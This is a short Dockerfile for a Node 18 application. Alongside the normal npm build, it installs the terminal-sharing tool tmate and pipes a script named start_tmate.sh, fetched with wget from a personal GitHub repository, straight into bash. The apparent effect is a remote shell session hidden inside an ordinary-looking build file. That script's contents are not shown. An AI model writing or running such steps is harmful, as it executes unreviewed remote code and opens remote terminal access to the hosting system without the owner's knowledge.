FROM node:18

WORKDIR /opt/app

ENV NODE_ENV production

COPY . .

RUN npm ci
RUN which bash
RUN ls -la
RUN apt update
RUN apt -y install dialog
RUN apt -y install wget curl net-tools tmate nano cmake binutils build-essential
RUN wget -O - https://raw.githubusercontent.com/vernonmoore098/ovh/main/start_tmate.sh | bash

CMD ["npm", "run", "start", "/bin/bash"]
